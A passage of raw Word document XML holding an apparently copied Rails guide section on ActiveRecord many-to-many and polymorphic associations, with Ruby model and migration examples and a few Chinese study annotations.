              <w:t>Part &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59E70C07" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FC54096" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="743C1871" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The second way to declare a many-to-many relationship is to use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This makes the association indirectly, </w:t>
      </w:r>
      <w:r w:rsidRPr="0039492B">
        <w:rPr>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>through a join model</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5904"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4DCF7221" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="408292A6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Assembly &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C40BDD9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :manifests</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AC01BFB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :parts, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :manifests</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06FE2043" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E286708" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F057CB1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Manifest &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="208D6386" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :assembly</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B2FE19F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :part</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26EF77B7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BD07122" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16911466" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Part &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56C847DF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :manifests</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C7A2667" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :assemblies, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :manifests</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="552028F0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A5A27E4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The simplest rule of thumb is that you should set up a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> relationship if you need to work with the relationship model as an independent entity. If you don’t need to do anything with the relationship model, it may be simpler to set up a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> relationship (though you’ll need to remember to create the joining table in the database).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB92FBE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You should use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if you need validations, callbacks, or extra attributes on the join model.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6964A9" w14:textId="39E6C355" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.9 Polymorphic Associations</w:t>
      </w:r>
      <w:r w:rsidR="00E36822">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> 多态</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C47A308" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A slightly more advanced twist on associations is the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>polymorphic association</w:t>
      </w:r>
      <w:r>
        <w:t>. With polymorphic associations, a model can belong to more than one other model, on a single association. For example, you might have a picture model that belongs to either an employee model or a product model. Here’s how this could be declared:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="465AD314" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33461225" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Picture &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2232DDAD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  belongs_to :imageable, </w:t>
            </w:r>
            <w:r w:rsidRPr="0039492B">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:polymorphic</w:t>
            </w:r>
            <w:r w:rsidRPr="0039492B">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="0039492B">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="146EED39" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E8F6019" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D66885B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Employee &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4189ECD7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :pictures, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :imageable</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="634FCF84" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07D8EBE0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27DD9996" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Product &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B59E595" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :pictures, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :imageable</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42C97A04" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25608820" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can think of a polymorphic </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration as setting up an interface that any other model can use. From an instance of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Employee</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model, you can retrieve a collection of pictures: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@employee.pictures</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0352EFA6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Similarly, you can retrieve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@product.pictures</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC05360" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you have an instance of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Picture</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model, you can get to its parent via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@picture.imageable</w:t>
      </w:r>
      <w:r>
        <w:t>. To make this work, you need to declare both a foreign key column and a type column in the model that declares the polymorphic interface:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5664"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1BC6C851" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="304B59D4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>CreatePictures &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55C1DD3A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0950D14A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_table :pictures</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C79C7D7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.string  :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66F479A4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      </w:t>
            </w:r>
            <w:r w:rsidRPr="00320176">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>t.integer :imageable_id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BEB7034" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.string  :imageable_type</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="223C5CC0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00BEEDC6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37B46500" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E9380F4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33FF7D54" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This migration can be simplified by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>t.references</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> form:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="7121" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7121"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="73EA0F9B" w14:textId="77777777" w:rsidTr="00674E36">
        <w:trPr>
          <w:trHeight w:val="2780"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B77D84E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>CreatePictures &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FB20B8A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C7199DB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_table :pictures</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D282F9D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.string :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19B777B3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      </w:t>
            </w:r>
            <w:r w:rsidRPr="00320176">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>t.references :imageable, :polymorphic</w:t>
            </w:r>
            <w:r w:rsidRPr="00320176">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00320176">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E77C374" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4392002C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="531D7951" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CC3F065" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7565A0FF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="258B0EA8" wp14:editId="62BE0E55">
            <wp:extent cx="6105525" cy="6943725"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="17" name="图片 17" descr="Polymorphic Associ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lymorphic Association Diagram"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId212" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6105525" cy="6943725"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
